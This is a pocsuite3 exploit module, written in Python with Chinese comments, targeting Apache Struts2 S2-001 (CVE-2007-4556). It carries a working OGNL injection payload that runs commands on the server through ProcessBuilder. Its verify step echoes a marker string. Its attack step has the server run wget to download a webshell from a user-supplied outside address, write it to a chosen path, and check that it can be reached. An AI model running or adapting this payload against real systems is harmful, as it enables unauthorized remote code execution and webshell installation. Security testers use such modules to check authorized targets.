import os, base64
from urllib.parse import quote, urljoin
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, OptString, OptBool
from pocsuite3.lib.utils import random_str

class DemoPOC(POCBase):
    vulID = 'S2-001 CVE-2007-4556'
    version = '1.0'
    author = ['cz']
    vulDate = '2019-11-13'
    createDate = '2019-11-13'
    updateDate = '2019-11-13'
    references = ['https://cwiki.apache.org/confluence/display/WW/S2-001', 'https://dean2021.github.io/posts/s2-001/']
    name = 'Struts2 S2-001 RCE'
    appPowerLink = 'https://struts.apache.org/'
    appName = 'Struts2'
    appVersion = 'Struts 2.0.0-2.0.8'
    vulType = 'Romote Code Execution'
    desc = '''该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{{value}{} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{{value}} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行。'''
    samples = []
    install_requires = ['']
    pocDesc = ''
    testEnv = 'Ubuntu_18.04-Struts_2.0.0'
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _options(self):
        o = OrderedDict()
        o['data'] = OptString('', description='需要POST的data，漏洞点用d3adb335做占位符，非url编码', require=True)
        o['sessionKeep'] = OptBool(default=False, description='该值为True时，需要设置sessionGetUrl', require=False)
        o['sessionGetUrl'] = OptString('', description='先访问一个url以获得session', require=False)
        o['shellDownloadUrl'] = OptString('', description='下载shell的地址', require=False)
        o['shellWritePath'] = OptString('', description='下载的shell保存的路径', require=False)
        return o

    def _verify(self):
        result = {}

        # 有的网站需要session，在考虑是否将框架加上这个功能
        # 目前先在poc中实现吧
        s = requests.session()
        sessionKeep = self.get_option('sessionKeep')
        if sessionKeep == True:
            sessionGetUrl = self.get_option('sessionGetUrl')
            s.get(sessionGetUrl)
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        cmd = 'echo DEADBEEF'
        cmd = cmd.split(' ')
        for i in range(len(cmd)):
            cmd[i] = '"' + cmd[i] + '"'
        cmd = ', '.join(cmd)
        payload = '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{''' + cmd + '''})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'''
        qpayload = quote(payload)
        data = self.get_option('data')
        data = data.replace('d3adb335', qpayload)
        resp = s.post(self.url, headers=headers, data=data)
        try:
            if resp.status_code == 200 and 'DEADBEEF' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)

    def _attack(self):
        result = {}

        s = requests.session()
        sessionKeep = self.get_option('sessionKeep')
        if sessionKeep == True:
            sessionGetUrl = self.get_option('sessionGetUrl')
            s.get(sessionGetUrl)
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        shellDownloadUrl = self.get_option('shellDownloadUrl')
        shellWritePath = self.get_option('shellWritePath')
        cmd = 'wget {shellDownloadUrl} -O {shellWritePath}'.format(
            shellDownloadUrl=shellDownloadUrl, shellWritePath=shellWritePath)
        cmd = cmd.split(' ')
        for i in range(len(cmd)):
            cmd[i] = '"' + cmd[i] + '"'
        cmd = ', '.join(cmd)
        payload = '''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{''' + cmd + '''})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'''
        qpayload = quote(payload)
        data = self.get_option('data')
        data = data.replace('d3adb335', qpayload)
        r = s.post(self.url, headers=headers, data=data)

        resp = s.get(urljoin(self.url, os.path.split(shellWritePath)[-1]))
        try:
            if resp.status_code != 404:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Postdata'] = payload
                result['shellInfo'] = {}
                result['shellInfo']['URL'] = urljoin(self.url, os.path.split(shellWritePath)[-1])
                result['shellInfo']['Content'] = 'CzCzCz'
        except Exception as ex:
            logger.error(str(ex))
        return self.parse_output(result)
    
register_poc(DemoPOC)
